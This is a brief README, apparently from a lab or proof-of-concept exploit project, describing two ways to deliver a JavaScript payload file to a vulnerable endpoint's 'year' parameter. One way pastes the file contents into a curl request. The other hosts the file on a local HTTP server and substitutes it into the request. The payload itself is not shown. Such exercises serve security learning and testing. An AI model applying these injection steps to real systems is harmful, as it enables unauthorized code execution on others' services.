# How to use the payload

## Method 1
Copy the contents of the payload file, and paste it directly at the vulnerable endpoint.
1. `xclip -in oneliner.js -selection clipboard`
2. `curl -G --data-urlencode "year=<payload>" http://localhost:3000`

## Method 2
Host a server from the current working directory and pass URL to the vulnerable endpoint.
1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/oneliner.js)" http://localhost:3000`
